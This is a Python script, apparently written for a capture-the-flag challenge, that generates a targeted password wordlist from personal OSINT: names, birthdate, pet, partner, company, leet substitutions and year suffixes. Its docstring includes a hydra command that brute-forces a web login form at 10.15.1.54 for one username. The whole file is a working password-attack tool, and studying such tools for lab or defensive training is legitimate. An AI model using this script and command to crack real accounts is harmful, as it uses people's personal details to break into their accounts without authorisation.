#!/usr/bin/env python3
"""
gen_wordlist.py - cupp-style targeted wordlist generator from OSINT.

Challenge "10": after finding a valid username, build a SMALL, targeted
wordlist from the human's OSINT (name, birthdate, pet, company, hobby...) and
crack that one account. A targeted list of a few thousand beats the whole
rockyou against one user.

Usage (typical):
    python3 gen_wordlist.py --first john --last doe --nick jd \
        --birthdate 1988-03-12 --partner maria --pet rex \
        --company acme --extra secure --extra desk --out target.txt

Then:
    hydra -l jdoe -P target.txt -s 9010 -t 8 -f 10.15.1.54 \
        http-post-form "/login:username=^USER^&password=^PASS^:F=Incorrect"
"""
import argparse
import itertools
import sys


LEET = {"a": ["a", "@", "4"], "e": ["e", "3"], "i": ["i", "1"],
        "o": ["o", "0"], "s": ["s", "5", "$"]}


def leet_variants(word, max_variants=6):
    """Simple leet substitutions (bounded, to avoid explosion)."""
    out = {word}
    for ch, subs in LEET.items():
        if ch in word.lower():
            for s in subs[1:]:
                out.add(word.replace(ch, s))
                out.add(word.replace(ch.upper(), s))
    return list(out)[:max_variants]


def years():
    ys = [str(y) for y in range(1990, 2027)]
    ys += ["%02d" % y for y in range(0, 100)]      # 2-digit
    ys += ["123", "1234", "12345", "007", "69", "21", "01"]
    return ys


def date_parts(birthdate):
    """birthdate like 1988-03-12 -> 12, 03, 1988, 1203, 0312, 1988, 120388..."""
    parts = [p for p in birthdate.replace("/", "-").replace(".", "-").split("-") if p]
    if len(parts) == 3:
        y, m, d = parts
        if len(y) == 4:                     # y-m-d
            return [d, m, y, d + m, m + d, y, d + m + y, y + m + d,
                    y[2:], d + m + y[2:]]
        else:                               # d-m-y
            d, m, y = parts
            return [d, m, y, d + m, m + d, y, d + m + y, y + m + d,
                    y[2:], d + m + y[2:]]
    return parts


def suffixes():
    syms = ["", "!", "@", "#", "$", ".", "_", "?", "1!", "!1", "123!", "!123",
            "123", "1234", "12345", "12", "01", "007", "2024", "2025", "2026",
            "!", "1", "22", "99", "@123", "#1"]
    return syms


def main(argv=None):
    p = argparse.ArgumentParser(description="cupp-style wordlist generator")
    p.add_argument("--first", default="")
    p.add_argument("--last", default="")
    p.add_argument("--nick", default="")
    p.add_argument("--partner", default="")
    p.add_argument("--pet", default="")
    p.add_argument("--company", default="")
    p.add_argument("--birthdate", default="")
    p.add_argument("--extra", action="append", default=[])
    p.add_argument("--out", default=None, help="output file (default stdout)")
    p.add_argument("--leet", action="store_true", help="add leet substitutions")
    a = p.parse_args(argv)

    bases = set()

    def add_base(*words):
        words = [w for w in words if w]
        for w in words:
            bases.add(w.lower())
        # combinations
        if len(words) >= 2:
            for perm in itertools.permutations(words, 2):
                bases.add(("".join(perm)).lower())
                bases.add((".".join(perm)).lower())
                bases.add(("_".join(perm)).lower())
            bases.add("".join(words).lower())

    add_base(a.first, a.last, a.nick, a.pet, a.partner, a.company, *a.extra)
    # first initial + last, etc.
    if a.first and a.last:
        add_base(a.first[0] + a.last, a.last + a.first[0])
    if a.first and a.company:
        add_base(a.first, a.company)

    # expand case variants
    words = set()
    for b in bases:
        words.add(b)
        words.add(b.capitalize())
        words.add(b.upper())
        if len(b) > 1:
            words.add(b[0].upper() + b[1:])

    # leet
    if a.leet:
        for b in list(bases):
            words.update(leet_variants(b))

    # numeric/date suffixes
    nums = set(date_parts(a.birthdate)) if a.birthdate else set()
    nums.update(years())
    nums.update(suffixes())

    final = set()
    for w in words:
        final.add(w)
        for n in nums:
            final.add(w + n)
            final.add(w + n + "!")
        for s in ["!", "@", "#", "123", "1"]:
            final.add(w + s)

    # keep sensible lengths
    final = {w for w in final if 1 <= len(w) <= 30}

    out_lines = sorted(final, key=lambda x: (len(x), x))
    text = "\n".join(out_lines) + "\n"
    if a.out:
        with open(a.out, "w", encoding="utf-8") as fh:
            fh.write(text)
        sys.stderr.write("[*] wrote %d candidates -> %s\n" % (len(out_lines), a.out))
    else:
        sys.stdout.write(text)
    return 0


if __name__ == "__main__":
    sys.exit(main())
